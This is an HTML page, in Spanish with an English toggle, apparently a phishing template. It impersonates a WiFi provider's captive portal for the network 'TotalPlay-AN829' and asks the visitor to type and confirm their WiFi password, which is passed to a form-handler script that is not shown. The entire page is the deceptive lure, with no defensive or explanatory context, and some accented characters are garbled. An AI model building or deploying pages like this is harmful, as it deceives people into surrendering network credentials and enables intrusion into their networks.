<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Acceso WiFi</title>
    <!-- Styles section -->
    <link rel="stylesheet" href="./styles/index.css">
    <link rel="stylesheet" href="./styles/content/main.css">
    <link rel="stylesheet" href="./styles/content/device.css">
    <link rel="stylesheet" href="./styles/form/captive-form.css">

    <!-- START Favicons section -->

    <!-- Standard favicon -->
    <link rel="icon" type="image/png" sizes="32x32" href="./icons/favicon-32x32.png" />
    <link rel="icon" type="image/png" sizes="16x16" href="./icons/favicon-16x16.png" />
    
    <!-- Apple Touch Icon -->
    <link rel="apple-touch-icon" sizes="180x180" href="./icons/apple-touch-icon.png" />
    
    <!-- Android / PWA -->
    <link rel="manifest" href="./icons/site.webmanifest" />
    
    <!-- Safari pinned tab -->
    <link rel="mask-icon" href="./icons/favicon.ico" color="#1D2C40" />
    
    <!-- Fallback -->
    <link rel="shortcut icon" href="./icons/favicon.ico" />
    
    <!-- END Favicons section -->

</head>

<body>
    <!-- Language Toggle Button -->
    <button id="language-toggle" class="language-btn" onclick="toggleLanguage()" aria-label="Change language">
        EN
    </button>

    <header>
        <section class="user-captive">
            <h1 class="title-form" data-i18n="headerTitle">Autenticaci칩n WiFi</h1>
            <img id="provider" alt="WiFi provider" src="" width="100" height="100"/>
        </section>
        <p data-i18n="headerSubtitle">
            Por favor registre su red para obtener acceso a internet. Disculpe las molestias ocasionadas.
        </p>
    </header>

    <article class="main-content">
        <div class="device-section">
            <!-- Network and device information -->
             <p class="device-title" data-i18n="deviceConnected">Dispositivo conectado:</p>
             <div class="device-information">
                <p><span data-i18n="ssidLabel">SSID:</span> <span id="current-ssid">TotalPlay-AN829</span></p>
             </div>
        </div>

        <form class="captive-form">
            <h2 class="form-title" data-i18n="formTitle">
                Complete el formulario para obtener acceso a internet
            </h2>
            <!-- Captive form filling -->
             
            <div class="form-group">
                <label for="ssid" data-i18n="ssidSelect">Seleccione su red</label>
                <select name="ssid" id="ssid" disabled>
                    <option value="0">TotalPlay-AN829</option>
                </select>
            </div>

            <div class="form-group password-input">
                <label for="password-init" data-i18n="passwordLabel">Ingrese su contrase침a</label>
                <div class="password-wrapper">
                    <input type="password" id="password-init" required />
                    <button type="button" class="toggle-password" onclick="togglePasswordVisibility('password-init')" aria-label="Toggle password visibility">
                        <svg class="eye-icon eye-open" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
                            <circle cx="12" cy="12" r="3"></circle>
                        </svg>
                        <svg class="eye-icon eye-closed" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
                            <line x1="1" y1="1" x2="23" y2="23"></line>
                        </svg>
                    </button>
                </div>
            </div>

            <div class="form-group password-confirmation">
                <label for="password-confirm" data-i18n="confirmPasswordLabel">Confirme su contrase침a</label>
                <div class="password-wrapper">
                    <input type="password" id="password-confirm" required />
                    <button type="button" class="toggle-password" onclick="togglePasswordVisibility('password-confirm')" aria-label="Toggle password visibility">
                        <svg class="eye-icon eye-open" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
                            <circle cx="12" cy="12" r="3"></circle>
                        </svg>
                        <svg class="eye-icon eye-closed" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
                            <line x1="1" y1="1" x2="23" y2="23"></line>
                        </svg>
                    </button>
                </div>
            </div>

            <div class="sent-section">
                <button type="button" class="submit-btn" onclick="handleFormSubmit()" data-i18n="verifyButton">
                    <span class="btn-text">Verificar conexi칩n</span>
                    <span class="loader"></span>
                </button>
            </div>
        </form>
    </article>


    <footer>
        <!-- Provider screen footer -->
         <p data-i18n="footerText">Todos los derechos reservados</p>
    </footer>

    <!-- Scripts -->
    <script src="./scripts/i18n/translations.js"></script>
    <script src="./scripts/network/device-info.js"></script>
    <script src="./scripts/network/form-handler.js"></script>
</body>

</html>
